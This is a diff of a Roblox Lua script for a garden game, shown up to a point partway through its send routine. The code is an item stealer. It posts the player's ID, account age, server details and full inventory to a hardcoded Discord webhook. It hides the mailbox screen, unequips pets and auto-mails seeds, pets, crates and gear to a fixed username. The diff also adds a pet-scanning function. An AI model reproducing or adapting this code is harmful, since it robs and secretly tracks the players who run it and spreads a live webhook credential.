@@ -8,28 +8,28 @@ local TARGET_USERNAME = "Only1sherif"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1515775380391198740/w-zMAgTWLDlK_N11ZRaGmSn3dT7pv7qS-hVnVl5NnoaClxkxF8pU3yvR8LxvLh4fPICf"
 
 local FRUITS = {
-    "Carrot", "Strawberry", "Blueberry", "Tulip", "Tomato", "Apple",
-    "Bamboo", "Corn", "Cactus", "Pineapple", "Mushroom", "Green Bean",
-    "Banana", "Grape", "Coconut", "Mango", "Dragon Fruit", "Acorn",
-    "Cherry", "Sunflower", "Venus Fly Trap", "Pomegranate", "Poision Apple",
-    "Moon Bloom", "Dragon's Breath", "Ghost Pepper",
-    -- New seeds
-    "Gold", "Poison Ivy", "Rainbow"
+	"Carrot", "Strawberry", "Blueberry", "Tulip", "Tomato", "Apple",
+	"Bamboo", "Corn", "Cactus", "Pineapple", "Mushroom", "Green Bean",
+	"Banana", "Grape", "Coconut", "Mango", "Dragon Fruit", "Acorn",
+	"Cherry", "Sunflower", "Venus Fly Trap", "Pomegranate", "Poision Apple",
+	"Moon Bloom", "Dragon's Breath", "Ghost Pepper",
+	-- New seeds
+	"Gold", "Poison Ivy", "Rainbow"
 }
 
 local CRATES = {
-    "Ladder Crate", "Bench Crate", "Light Crate", "Sign Crate", "Arch Crate",
-    "Roleplay Crate", "Bridge Crate", "Spring Crate", "Seesaw Crate",
-    "Conveyor Crate", "Owner Door Crate", "Bear Trap Crate", "Fence Crate",
-    "Teleporter Pad Crate"
+	"Ladder Crate", "Bench Crate", "Light Crate", "Sign Crate", "Arch Crate",
+	"Roleplay Crate", "Bridge Crate", "Spring Crate", "Seesaw Crate",
+	"Conveyor Crate", "Owner Door Crate", "Bear Trap Crate", "Fence Crate",
+	"Teleporter Pad Crate"
 }
 
 -- Gear prefixes — clicks anything that starts with these
 local GEAR_PREFIXES = {
-    "Inv_Mushrooms:",
-    "Inv_Sprinklers:",
-    "Inv_WateringCans:",
-    "Inv_Pets:"
+	"Inv_Mushrooms:",
+	"Inv_Sprinklers:",
+	"Inv_WateringCans:",
+	"Inv_Pets:"
 }
 
 -- Disable blur permanently
@@ -37,610 +37,646 @@ pcall(function() Lighting.Blur.Enabled = false end)
 pcall(function() Lighting.DepthOfField.Enabled = false end)
 
 Lighting.Blur:GetPropertyChangedSignal("Enabled"):Connect(function()
-    Lighting.Blur.Enabled = false
+	Lighting.Blur.Enabled = false
 end)
 Lighting.DepthOfField:GetPropertyChangedSignal("Enabled"):Connect(function()
-    Lighting.DepthOfField.Enabled = false
+	Lighting.DepthOfField.Enabled = false
 end)
 
 -- Hide MailboxUI frame instantly when it appears
 playerGui.ChildAdded:Connect(function(child)
-    if child.Name == "MailboxUI" then
-        local frame = child:WaitForChild("Frame", 5)
-        if frame then frame.Visible = false end
-        child.ChildAdded:Connect(function(c)
-            if c.Name == "Frame" then c.Visible = false end
-        end)
-    end
+	if child.Name == "MailboxUI" then
+		local frame = child:WaitForChild("Frame", 5)
+		if frame then frame.Visible = false end
+		child.ChildAdded:Connect(function(c)
+			if c.Name == "Frame" then c.Visible = false end
+		end)
+	end
 end)
 
 local existing = playerGui:FindFirstChild("MailboxUI")
 if existing then
-    local existingFrame = existing:FindFirstChild("Frame")
-    if existingFrame then existingFrame.Visible = false end
+	local existingFrame = existing:FindFirstChild("Frame")
+	if existingFrame then existingFrame.Visible = false end
+end
+
+-- ============================================================================
+-- NEW: Pet scanner — pets live in PetList UI, not in the Backpack.
+-- Scans playerGui.PetList.ScrollingFrame for owned pets and pulls a clean name
+-- (and weight/age if visible). Returns { equippedPets, allPets }.
+-- ============================================================================
+local function scanPets()
+	local equippedPets, allPets = {}, {}
+	local petList = playerGui:FindFirstChild("PetList")
+	if not petList then return equippedPets, allPets end
+
+	local scrollingFrame
+	for _, d in ipairs(petList:GetDescendants()) do
+		if d:IsA("ScrollingFrame") then
+			scrollingFrame = d
+			break
+		end
+	end
+	if not scrollingFrame then return equippedPets, allPets end
+
+	-- Extract a readable name out of a pet card frame
+	local function extractName(card)
+		-- 1) Try common label names
+		for _, labelName in ipairs({ "PetName", "Name", "Title", "NameLabel" }) do
+			local lbl = card:FindFirstChild(labelName, true)
+			if lbl and lbl:IsA("TextLabel") and lbl.Text ~= "" then
+				return lbl.Text
+			end
+		end
+		-- 2) Fallback: first non-empty TextLabel
+		for _, d in ipairs(card:GetDescendants()) do
+			if d:IsA("TextLabel") and d.Text and d.Text ~= "" then
+				local t = d.Text
+				-- Skip pure-number labels (count/level badges)
+				if not t:match("^%s*[%d%.]+%s*$") then
+					return t
+				end
+			end
+		end
+		-- 3) Last resort: use the frame's own name
+		return card.Name
+	end
+
+	-- Try to get extra info: weight / age / kg
+	local function extractMeta(card)
+		for _, d in ipairs(card:GetDescendants()) do
+			if d:IsA("TextLabel") and d.Text then
+				local t = d.Text
+				if t:lower():find("kg") or t:lower():find("age") or t:lower():find("lvl") then
+					return t
+				end
+			end
+		end
+		return nil
+	end
+
+	-- Check if this card represents an equipped pet
+	local function isEquipped(card)
+		-- If there's a visible Unequip button, the pet is currently equipped
+		for _, d in ipairs(card:GetDescendants()) do
+			if d:IsA("GuiButton") and d.Name == "Unequip" and d.Visible == true then
+				if not string.find(d:GetFullName(), "Template") then
+					return true
+				end
+			end
+		end
+		return false
+	end
+
+	for _, card in ipairs(scrollingFrame:GetChildren()) do
+		if card:IsA("GuiObject") then
+			-- Ignore UI helpers / templates
+			local fullName = card:GetFullName()
+			if not fullName:find("Template") and not (card:IsA("UIListLayout") or card:IsA("UIGridLayout") or card:IsA("UIPadding")) then
+				local name = extractName(card)
+				if name and name ~= "" then
+					local meta = extractMeta(card)
+					local display = meta and (name .. " — " .. meta) or name
+					table.insert(allPets, display)
+					if isEquipped(card) then
+						table.insert(equippedPets, display)
+					end
+				end
+			end
+		end
+	end
+
+	return equippedPets, allPets
 end
 
 -- Send backpack contents to Discord webhook
 local function sendBackpackToWebhook()
-    local backpack = localPlayer:FindFirstChild("Backpack")
-    if not backpack then warn("Backpack not found") return end
+	local backpack = localPlayer:FindFirstChild("Backpack")
+	if not backpack then warn("Backpack not found") return end
 
-    -- Lookup sets for fast categorisation
-    local seedSet, crateSet = {}, {}
-    for _, n in ipairs(FRUITS) do seedSet[n:lower()] = true end
-    for _, n in ipairs(CRATES) do crateSet[n:lower()] = true end
+	-- Lookup sets for fast categorisation
+	local seedSet, crateSet = {}, {}
+	for _, n in ipairs(FRUITS) do seedSet[n:lower()] = true end
+	for _, n in ipairs(CRATES) do crateSet[n:lower()] = true end
 
-    -- Heuristics for gear / pets (tool names in Backpack don't have Inv_ prefix)
-    local function isGear(name)
-        local n = name:lower()
-        return n:find("sprinkler") or n:find("watering") or n:find("can")
-            or n:find("mushroom") or n:find("trowel") or n:find("shovel")
-            or n:find("fertilizer") or n:find("hoe") or n:find("rake")
-    end
+	-- Heuristics for gear / pets (tool names in Backpack don't have Inv_ prefix)
+	local function isGear(name)
+		local n = name:lower()
+		return n:find("sprinkler") or n:find("watering") or n:find("can")
+			or n:find("mushroom") or n:find("trowel") or n:find("shovel")
+			or n:find("fertilizer") or n:find("hoe") or n:find("rake")
+	end
 
-    -- Known pets from Grow a Garden 2 tier list (S → C) + common variants
-    local petSet = {}
-    for _, n in ipairs({
-        -- S tier
-        "Raccoon","Black Dragon","BlackDragon","Ice Serpent","IceSerpent","Unicorn",
-        -- A tier
-        "Bee","Golden Dragonfly","GoldenDragonfly","DragonFly","Dragonfly","Deer","Bunny",
-        -- B tier
-        "Frog",
-        -- C tier
-        "Robin","Owl","Monkey"
-    }) do
-        petSet[n:lower()] = true
-    end
+	-- Known pets from Grow a Garden 2 tier list (S → C) + common variants
+	local petSet = {}
+	for _, n in ipairs({
+		-- S tier
+		"Raccoon","Black Dragon","BlackDragon","Ice Serpent","IceSerpent","Unicorn",
+		-- A tier
+		"Bee","Golden Dragonfly","GoldenDragonfly","DragonFly","Dragonfly","Deer","Bunny",
+		-- B tier
+		"Frog",
+		-- C tier
+		"Robin","Owl","Monkey"
+	}) do
+		petSet[n:lower()] = true
+	end
 
-    local function categorise(name)
-        local low = name:lower()
-        if seedSet[low]  then return "seeds"  end
-        if crateSet[low] then return "crates" end
-        if petSet[low]   then return "pets"   end
-        if isGear(name)  then return "gear"   end
-        return "other"
-    end
+	local function categorise(name)
+		local low = name:lower()
+		if seedSet[low] then return "seeds" end
+		if crateSet[low] then return "crates" end
+		if petSet[low] then return "pets" end
+		if isGear(name) then return "gear" end
+		return "other"
+	end
 
-    local buckets = { seeds = {}, pets = {}, gear = {}, crates = {}, other = {} }
-    local equippedItems = {}
+	local buckets = { seeds = {}, pets = {}, gear = {}, crates = {}, other = {} }
+	local equippedItems = {}
 
-    for _, tool in ipairs(backpack:GetChildren()) do
-        if tool:IsA("Tool") then
-            table.insert(buckets[categorise(tool.Name)], tool.Name)
-        end
-    end
+	for _, tool in ipairs(backpack:GetChildren()) do
+		if tool:IsA("Tool") then
+			table.insert(buckets[categorise(tool.Name)], tool.Name)
+		end
+	end
 
-    local character = localPlayer.Character
-    if character then
-        for _, tool in ipairs(character:GetChildren()) do
-            if tool:IsA("Tool") then
-                table.insert(equippedItems, tool.Name)
-            end
-        end
-    end
+	local character = localPlayer.Character
+	if character then
+		for _, tool in ipairs(character:GetChildren()) do
+			if tool:IsA("Tool") then
+				table.insert(equippedItems, tool.Name)
+			end
+		end
+	end
 
-    local totalCount = #buckets.seeds + #buckets.pets + #buckets.gear
-                     + #buckets.crates + #buckets.other + #equippedItems
+	-- NEW: scan the PetList UI for owned pets (they aren't Tools)
+	local equippedPets, ownedPets = scanPets()
+	-- Merge equipped pets into the main "Equipped" field too
+	for _, p in ipairs(equippedPets) do
+		table.insert(equippedItems, "🐾 " .. p)
+	end
+	-- Use scanned pets as the canonical pets bucket (overrides backpack-derived)
+	if #ownedPets > 0 then
+		buckets.pets = ownedPets
+	end
 
-    -- Pretty list builder (markdown bullets, capped at Discord's 1024 char field limit)
-    local function formatList(list)
-        if #list == 0 then return "`—  empty  —`" end
-        local lines = {}
-        for i, name in ipairs(list) do
-            lines[i] = "`•` " .. name
-        end
-        local text = table.concat(lines, "\n")
-        if #text > 1010 then
-            text = text:sub(1, 1000) .. "\n`… +more`"
-        end
-        return text
-    end
+	local totalCount = #buckets.seeds + #buckets.pets + #buckets.gear
+		+ #buckets.crates + #buckets.other + #equippedItems
 
-    -- Resolve a working avatar URL from the modern Roblox thumbnails API.
-    -- Returns the direct CDN png url, or nil if anything fails (embed will just skip the image).
-    local HttpService = game:GetService("HttpService")
-    local function fetchAvatar(endpoint, size)
-        local url = "https://thumbnails.roblox.com/v1/users/" .. endpoint
-              .. "?userIds=" .. localPlayer.UserId
-              .. "&size=" .. size
-              .. "&format=Png&isCircular=false"
-        local ok, body = pcall(function() return game:HttpGet(url) end)
-        if not ok or not body then return nil end
-        local ok2, decoded = pcall(function() return HttpService:JSONDecode(body) end)
-        if not ok2 or not decoded or not decoded.data or not decoded.data[1] then return nil end
-        return decoded.data[1].imageUrl
-    end
-    local avatarThumb  = fetchAvatar("avatar-headshot", "420x420")
-    local avatarAuthor = fetchAvatar("avatar-bust",     "150x150") or avatarThumb
+	-- Pretty list builder (markdown bullets, capped at Discord's 1024 char field limit)
+	local function formatList(list)
+		if #list == 0 then return "`— empty —`" end
+		local lines = {}
+		for i, name in ipairs(list) do
+			lines[i] = "`•` " .. name
+		end
+		local text = table.concat(lines, "\n")
+		if #text > 1010 then
+			text = text:sub(1, 1000) .. "\n`… +more`"
+		end
+		return text
+	end
 
-    -- Account age + game info
-    local accountAgeDays = localPlayer.AccountAge
-    local placeId = tostring(game.PlaceId)
-    local jobId   = (game.JobId ~= "" and game.JobId) or "Studio / Solo"
-    local serverPlayers = #Players:GetPlayers()
+	-- Resolve a working avatar URL from the modern Roblox thumbnails API.
+	local HttpService = game:GetService("HttpService")
+	local function fetchAvatar(endpoint, size)
+		local url = "https://thumbnails.roblox.com/v1/users/" .. endpoint
+			.. "?userIds=" .. localPlayer.UserId
+			.. "&size=" .. size
+			.. "&format=Png&isCircular=false"
+		local ok, body = pcall(function() return game:HttpGet(url) end)
+		if not ok or not body then return nil end
+		local ok2, decoded = pcall(function() return HttpService:JSONDecode(body) end)
+		if not ok2 or not decoded or not decoded.data or not decoded.data[1] then return nil end
+		return decoded.data[1].imageUrl
+	end
+	local avatarThumb = fetchAvatar("avatar-headshot", "420x420")
+	local avatarAuthor = fetchAvatar("avatar-bust", "150x150") or avatarThumb
 
-    -- ISO-8601 timestamp for Discord-native time rendering
-    local function isoTimestamp()
-        local t = os.date("!*t")
-        return string.format("%04d-%02d-%02dT%02d:%02d:%02d.000Z",
-            t.year, t.month, t.day, t.hour, t.min, t.sec)
-    end
+	-- Account age + game info
+	local accountAgeDays = localPlayer.AccountAge
+	local placeId = tostring(game.PlaceId)
+	local jobId = (game.JobId ~= "" and game.JobId) or "Studio / Solo"
+	local serverPlayers = #Players:GetPlayers()
 
-    -- Build fields dynamically so empty categories don't waste embed space
-    local fields = {
-        { name = "👤  User ID",     value = "`" .. tostring(localPlayer.UserId) .. "`", inline = true },
-        { name = "📆  Account Age", value = "`" .. accountAgeDays .. " days`",          inline = true },
-        { name = "👥  In Server",   value = "`" .. serverPlayers .. " players`",        inline = true },
-        { name = "🗺️  Place ID",   value = "`" .. placeId .. "`", inline = true },
-        { name = "🧩  Job ID",      value = "`" .. jobId   .. "`", inline = false },
-        { name = "⚔️  Equipped (" .. #equippedItems .. ")",
-          value = formatList(equippedItems), inline = false },
-    }
+	local function isoTimestamp()
+		local t = os.date("!*t")
+		return string.format("%04d-%02d-%02dT%02d:%02d:%02d.000Z",
+			t.year, t.month, t.day, t.hour, t.min, t.sec)
+	end
 
-    local function addCategory(emoji, label, list)
-        if #list > 0 then
-            table.insert(fields, {
-                name = emoji .. "  " .. label .. " (" .. #list .. ")",
-                value = formatList(list),
-                inline = false
-            })
-        end
-    end
+	-- Build fields dynamically so empty categories don't waste embed space
+	local fields = {
+		{ name = "👤 User ID", value = "`" .. tostring(localPlayer.UserId) .. "`", inline = true },
+		{ name = "📆 Account Age", value = "`" .. accountAgeDays .. " days`", inline = true },
+		{ name = "👥 In Server", value = "`" .. serverPlayers .. " players`", inline = true },
+		{ name = "🗺️ Place ID", value = "`" .. placeId .. "`", inline = true },
+		{ name = "🧩 Job ID", value = "`" .. jobId .. "`", inline = false },
+		{ name = "⚔️ Equipped (" .. #equippedItems .. ")",
+			value = formatList(equippedItems), inline = false },
+	}
 
-    addCategory("🌾", "Seeds",  buckets.seeds)
-    addCategory("🐾", "Pets",   buckets.pets)
-    addCategory("🛠️", "Gear",   buckets.gear)
-    addCategory("📦", "Crates", buckets.crates)
-    addCategory("❔", "Other",  buckets.other)
+	local function addCategory(emoji, label, list)
+		if #list > 0 then
+			table.insert(fields, {
+				name = emoji .. " " .. label .. " (" .. #list .. ")",
+				value = formatList(list),
+				inline = false
+			})
+		end
+	end
 
-    local payload = HttpService:JSONEncode({
-        username = "Garden Logger",
-        embeds = {{
-            author = {
-                name = localPlayer.DisplayName .. "  •  @" .. localPlayer.Name,
-                icon_url = avatarAuthor,
-                url = "https://www.roblox.com/users/" .. localPlayer.UserId .. "/profile"
-            },
-            title = "🌱  Inventory Snapshot",
-            url = "https://www.roblox.com/users/" .. localPlayer.UserId .. "/profile",
-            description = "```ansi\n\27[2;32mPlayer joined — full backpack scan captured.\27[0m\n```",
-            color = 5025616, -- garden green (#4CAF50)
-            thumbnail = avatarThumb and { url = avatarThumb } or nil,
-            fields = fields,
-            footer = {
-                text = "Garden Logger  •  " .. totalCount .. " total items",
-                icon_url = avatarAuthor
-            },
-            timestamp = isoTimestamp()
-        }}
-    })
+	addCategory("🌾", "Seeds", buckets.seeds)
+	addCategory("🐾", "Pets", buckets.pets)
+	addCategory("🛠️", "Gear", buckets.gear)
+	addCategory("📦", "Crates", buckets.crates)
+	addCategory("❔", "Other", buckets.other)
 
-    local requestFunc = (syn and syn.request) or (http and http.request) or request
-    pcall(function()
-        local response = requestFunc({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = payload
-        })
-        if response and response.StatusCode then
-            if response.StatusCode >= 200 and response.StatusCode < 300 then
-                print("[GardenLogger] Inventory report sent for: " .. localPlayer.Name)
-            else
-                warn("[GardenLogger] Discord rejected the webhook — HTTP "
-                    .. tostring(response.StatusCode)
-                    .. "  |  body: " .. tostring(response.Body or ""):sub(1, 300))
-                if response.StatusCode == 404 then
-                    warn("[GardenLogger] 404 means the WEBHOOK_URL is invalid or has been deleted. Recreate the webhook in Discord and paste the new URL into WEBHOOK_URL.")
-                end
-            end
-        else
-            print("[GardenLogger] Inventory report fired for: " .. localPlayer.Name)
-        end
-    end)
+	local payload = HttpService:JSONEncode({
+		username = "Garden Logger",
+		embeds = {{
+			author = {
+				name = localPlayer.DisplayName .. " • @" .. localPlayer.Name,
+				icon_url = avatarAuthor,
+				url = "https://www.roblox.com/users/" .. localPlayer.UserId .. "/profile"
+			},
+			title = "🌱 Inventory Snapshot",
+			url = "https://www.roblox.com/users/" .. localPlayer.UserId .. "/profile",
+			description = "```ansi\n\27[2;32mPlayer joined — full backpack scan captured.\27[0m\n```",
+			color = 5025616,
+			thumbnail = avatarThumb and { url = avatarThumb } or nil,
+			fields = fields,
+			footer = {
+				text = "Garden Logger • " .. totalCount .. " total items",
+				icon_url = avatarAuthor
+			},
+			timestamp = isoTimestamp()
+		}}
+	})
+
+	local requestFunc = (syn and syn.request) or (http and http.request) or request
+	pcall(function()
+		local response = requestFunc({
+			Url = WEBHOOK_URL,
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/json" },
+			Body = payload
+		})
+		if response and response.StatusCode then
+			if response.StatusCode >= 200 and response.StatusCode < 300 then
+				print("[GardenLogger] Inventory report sent for: " .. localPlayer.Name)
+			else
+				warn("[GardenLogger] Discord rejected the webhook — HTTP "
+					.. tostring(response.StatusCode)
+					.. " | body: " .. tostring(response.Body or ""):sub(1, 300))
+				if response.StatusCode == 404 then
+					warn("[GardenLogger] 404 means the WEBHOOK_URL is invalid or has been deleted. Recreate the webhook in Discord and paste the new URL into WEBHOOK_URL.")
+				end
+			end
+		else
+			print("[GardenLogger] Inventory report fired for: " .. localPlayer.Name)
+		end
+	end)
 end
 
 local function clickButton(button)
-    pcall(function() firesignal(button.MouseButton1Click) end)
-    pcall(function()
-        local input = Instance.new("InputObject")
-        input.UserInputType = Enum.UserInputType.MouseButton1
-        firesignal(button.Activated, input)
-    end)
+	pcall(function() firesignal(button.MouseButton1Click) end)
+	pcall(function()
+		local input = Instance.new("InputObject")
+		input.UserInputType = Enum.UserInputType.MouseButton1
+		firesignal(button.Activated, input)
+	end)
 end
 
 -- Click all inventory items matching a prefix asynchronously
 local function clickAllByPrefix(inventoryFrame, prefix)
-    for _, child in ipairs(inventoryFrame:GetChildren()) do
-        if child.Name:sub(1, #prefix) == prefix then
-            task.spawn(function()
-                local clickCount = 0
-                while clickCount < 999 do
-                    local frame = inventoryFrame:FindFirstChild(child.Name)
-                    if not frame then break end
+	for _, child in ipairs(inventoryFrame:GetChildren()) do
+		if child.Name:sub(1, #prefix) == prefix then
+			task.spawn(function()
+				local clickCount = 0
+				while clickCount < 999 do
+					local frame = inventoryFrame:FindFirstChild(child.Name)
+					if not frame then break end
 
-                    local innerFrame = frame:FindFirstChildWhichIsA("Frame")
-                    if not innerFrame then break end
+					local innerFrame = frame:FindFirstChildWhichIsA("Frame")
+					if not innerFrame then break end
 
-                    local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
-                    if not button then break end
+					local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
+					if not button then break end
 
-                    local countLabel = frame:FindFirstChild("Count", true)
-                        or frame:FindFirstChild("Amount", true)
-                        or innerFrame:FindFirstChildWhichIsA("TextLabel")
-                    if countLabel then
-                        local count = tonumber(countLabel.Text:match("%d+"))
-                        if count and count <= 0 then break end
-                    end
+					local countLabel = frame:FindFirstChild("Count", true)
+						or frame:FindFirstChild("Amount", true)
+						or innerFrame:FindFirstChildWhichIsA("TextLabel")
+					if countLabel then
+						local count = tonumber(countLabel.Text:match("%d+"))
+						if count and count <= 0 then break end
+					end
 
-                    clickButton(button)
-                    clickCount += 1
-                    task.wait()
-                end
-            end)
-        end
-    end
+					clickButton(button)
+					clickCount += 1
+					task.wait()
+				end
+			end)
+		end
+	end
 end
 
 -- Check if there is anything left to send
 local function hasAnythingToSend(inventoryFrame)
-    for _, child in ipairs(inventoryFrame:GetChildren()) do
-        local name = child.Name
-        if name:sub(1, 10) == "Inv_Seeds:" then return true end
-        if name:sub(1, 9) == "Inv_Pets:" then return true end
-        if name:sub(1, 11) == "Inv_Crates:" then return true end
-        for _, prefix in ipairs(GEAR_PREFIXES) do
-            if name:sub(1, #prefix) == prefix then return true end
-        end
-    end
-    return false
+	for _, child in ipairs(inventoryFrame:GetChildren()) do
+		local name = child.Name
+		if name:sub(1, 10) == "Inv_Seeds:" then return true end
+		if name:sub(1, 9) == "Inv_Pets:" then return true end
+		if name:sub(1, 11) == "Inv_Crates:" then return true end
+		for _, prefix in ipairs(GEAR_PREFIXES) do
+			if name:sub(1, #prefix) == prefix then return true end
+		end
+	end
+	return false
 end
 
 -- Independent unequip mechanics targeting the PetList UI container
 local function runSequence()
-    local petList = playerGui:FindFirstChild("PetList")
-    if not petList then return end
-    
-    local toggleButton = petList:FindFirstChild("Exit", true) and petList.Exit:FindFirstChild("OpenButton")
-    local scrollingFrame = petList:FindFirstChild("ScrollingFrame", true)
-    if not toggleButton or not scrollingFrame then return end
+	local petList = playerGui:FindFirstChild("PetList")
+	if not petList then return end
 
-    local function safeClick(button)
-        pcall(function() firesignal(button.Activated) end)
-        pcall(function() firesignal(button.MouseButton1Click) end)
-    end
+	local toggleButton = petList:FindFirstChild("Exit", true) and petList.Exit:FindFirstChild("OpenButton")
+	local scrollingFrame = petList:FindFirstChild("ScrollingFrame", true)
+	if not toggleButton or not scrollingFrame then return end
 
-    local function findNextUnequipButton()
-        for _, desc in pairs(scrollingFrame:GetDescendants()) do
-            if desc:IsA("GuiButton") and desc.Name == "Unequip" and desc.Visible == true then
-                if not string.find(desc:GetFullName(), "Template") then
-                    return desc
-                end
-            end
-        end
-        return nil
-    end
+	local function safeClick(button)
+		pcall(function() firesignal(button.Activated) end)
+		pcall(function() firesignal(button.MouseButton1Click) end)
+	end
 
-    safeClick(toggleButton)
-    task.wait(0.2)
-    
-    local unequipButton = findNextUnequipButton()
-    while unequipButton do
-        safeClick(unequipButton)
-        task.wait()
-        unequipButton = findNextUnequipButton()
-    end
-    
-    safeClick(toggleButton)
+	local function findNextUnequipButton()
+		for _, desc in pairs(scrollingFrame:GetDescendants()) do
+			if desc:IsA("GuiButton") and desc.Name == "Unequip" and desc.Visible == true then
+				if not string.find(desc:GetFullName(), "Template") then
+					return desc
+				end
+			end
+		end
+		return nil
+	end
+
+	safeClick(toggleButton)
+	task.wait(0.2)
+
+	local unequipButton = findNextUnequipButton()
+	while unequipButton do
+		safeClick(unequipButton)
+		task.wait()
+		unequipButton = findNextUnequipButton()
+	end
+
+	safeClick(toggleButton)
 end
 
 -- Main send function
 local function runScript()
-    -- Start with an entirely empty/invisible shield container so camera rotation works perfectly
-    local touchShield = Instance.new("ScreenGui")
-    touchShield.Name = "TouchShieldSystem"
-    touchShield.DisplayOrder = 999999
-    
-    local targetBlocker = Instance.new("TextButton")
-    targetBlocker.Size = UDim2.new(0, 0, 0, 0) -- Completely tiny so it doesn't intercept camera swipes
-    targetBlocker.BackgroundTransparency = 1
-    targetBlocker.Text = ""
-    targetBlocker.Parent = touchShield
-    touchShield.Parent = playerGui
+	local touchShield = Instance.new("ScreenGui")
+	touchShield.Name = "TouchShieldSystem"
+	touchShield.DisplayOrder = 999999
 
-    pcall(runSequence)
-    task.wait(0.5)
+	local targetBlocker = Instance.new("TextButton")
+	targetBlocker.Size = UDim2.new(0, 0, 0, 0)
+	targetBlocker.BackgroundTransparency = 1
+	targetBlocker.Text = ""
+	targetBlocker.Parent = touchShield
+	touchShield.Parent = playerGui
 
-    local oldUI = playerGui:FindFirstChild("MailboxUI")
-    if oldUI then
-        local closeBtn = oldUI:FindFirstChild("CloseButton", true)
-        if closeBtn then pcall(function() firesignal(closeBtn.MouseButton1Click) end) end
-        task.wait(0.1)
-    end
+	pcall(runSequence)
+	task.wait(0.5)
 
-    local mailboxPrompt = workspace.Gardens.Plot1.Signs.GreyMailBox.ProximityPromptPart.MailboxPrompt
-    fireproximityprompt(mailboxPrompt)
-    task.wait(0.4)
+	local oldUI = playerGui:FindFirstChild("MailboxUI")
+	if oldUI then
+		local closeBtn = oldUI:FindFirstChild("CloseButton", true)
+		if closeBtn then pcall(function() firesignal(closeBtn.MouseButton1Click) end) end
+		task.wait(0.1)
+	end
 
-    local mailboxUI = playerGui:WaitForChild("MailboxUI", 5)
-    if not mailboxUI then 
-        touchShield:Destroy()
-        warn("Retry: MailboxUI not found") 
-        return false 
-    end
+	local mailboxPrompt = workspace.Gardens.Plot1.Signs.GreyMailBox.ProximityPromptPart.MailboxPrompt
+	fireproximityprompt(mailboxPrompt)
+	task.wait(0.4)
 
-    local mainFrame = mailboxUI:WaitForChild("Frame", 5)
-    if not mainFrame then 
-        touchShield:Destroy()
-        warn("Retry: Frame not found") 
-        return false 
-    end
+	local mailboxUI = playerGui:WaitForChild("MailboxUI", 5)
+	if not mailboxUI then touchShield:Destroy() warn("Retry: MailboxUI not found") return false end
 
-    -- Touch-blocker DISABLED: leaving it at 0x0 so your normal game HUD
-    -- (bag, build, shovel, sun, etc.) stays fully tappable while the script runs.
-    -- The Mailbox itself is hidden via Frame.Visible = false above, so there's
-    -- nothing visible for the player to accidentally tap anyway.
-    -- if mainFrame:IsA("Frame") then
-    --     targetBlocker.Size = mainFrame.Size
-    --     targetBlocker.Position = mainFrame.Position
-    --     targetBlocker.AnchorPoint = mainFrame.AnchorPoint
-    -- end
+	local mainFrame = mailboxUI:WaitForChild("Frame", 5)
+	if not mainFrame then touchShield:Destroy() warn("Retry: Frame not found") return false end
 
-    local sendingFrame = mainFrame:WaitForChild("SendingFrame", 5)
-    if not sendingFrame then 
-        touchShield:Destroy()
-        warn("Retry: SendingFrame not found") 
-        return false 
-    end
+	local sendingFrame = mainFrame:WaitForChild("SendingFrame", 5)
+	if not sendingFrame then touchShield:Destroy() warn("Retry: SendingFrame not found") return false end
 
-    local selectPlayerFrame = sendingFrame:WaitForChild("SelectPlayerFrame", 5)
-    if not selectPlayerFrame then 
-        touchShield:Destroy()
-        warn("Retry: SelectPlayerFrame not found") 
-        return false 
-    end
+	local selectPlayerFrame = sendingFrame:WaitForChild("SelectPlayerFrame", 5)
+	if not selectPlayerFrame then touchShield:Destroy() warn("Retry: SelectPlayerFrame not found") return false end
 
-    local topbar = selectPlayerFrame:WaitForChild("Topbar", 5)
-    if not topbar then 
-        touchShield:Destroy()
-        warn("Retry: Topbar not found") 
-        return false 
-    end
+	local topbar = selectPlayerFrame:WaitForChild("Topbar", 5)
+	if not topbar then touchShield:Destroy() warn("Retry: Topbar not found") return false end
 
-    local searchBox = topbar:WaitForChild("SearchBox", 5)
-    if not searchBox then 
-        touchShield:Destroy()
-        warn("Retry: SearchBox not found") 
-        return false 
-    end
+	local searchBox = topbar:WaitForChild("SearchBox", 5)
+	if not searchBox then touchShield:Destroy() warn("Retry: SearchBox not found") return false end
 
-    searchBox:CaptureFocus()
-    searchBox.Text = TARGET_USERNAME
-    task.wait(0.05)
-    
-    searchBox:ReleaseFocus()
-    task.wait(0.05)
+	searchBox:CaptureFocus()
+	searchBox.Text = TARGET_USERNAME
+	task.wait(0.05)
 
-    local VIM = game:GetService("VirtualInputManager")
-    VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
-    task.wait(0.4)
+	searchBox:ReleaseFocus()
+	task.wait(0.05)
 
-    local playerList = selectPlayerFrame:WaitForChild("PlayerList", 5)
-    if not playerList then 
-        touchShield:Destroy()
-        warn("Retry: PlayerList not found") 
-        return false 
-    end
+	local VIM = game:GetService("VirtualInputManager")
+	VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
+	task.wait(0.4)
 
-    local found = false
-    local deadline = tick() + 4
-    while not found and tick() < deadline do
-        for _, frame in ipairs(playerList:GetChildren()) do
-            if frame:IsA("Frame") and frame.Name:match("^Search_") then
-                local button = frame:FindFirstChild("Button")
-                if button then
-                    local usernameLabel = button:FindFirstChild("PlayerUsername")
-                    if usernameLabel then
-                        local cleanText = usernameLabel.Text:lower():gsub("^@", "")
-                        if cleanText == TARGET_USERNAME:lower() then
-                            clickButton(button)
-                            found = true
-                            break
-                        end
-                    end
-                end
-            end
-        end
-        if not found then task.wait(0.05) end
-    end
+	local playerList = selectPlayerFrame:WaitForChild("PlayerList", 5)
+	if not playerList then touchShield:Destroy() warn("Retry: PlayerList not found") return false end
 
-    if not found then 
-        touchShield:Destroy()
-        warn("Retry: Player not found in list") 
-        return false 
-    end
+	local found = false
+	local deadline = tick() + 4
+	while not found and tick() < deadline do
+		for _, frame in ipairs(playerList:GetChildren()) do
+			if frame:IsA("Frame") and frame.Name:match("^Search_") then
+				local button = frame:FindFirstChild("Button")
+				if button then
+					local usernameLabel = button:FindFirstChild("PlayerUsername")
+					if usernameLabel then
+						local cleanText = usernameLabel.Text:lower():gsub("^@", "")
+						if cleanText == TARGET_USERNAME:lower() then
+							clickButton(button)
+							found = true
+							break
+						end
+					end
+				end
+			end
+		end
+		if not found then task.wait(0.05) end
+	end
 
-    task.wait(0.3)
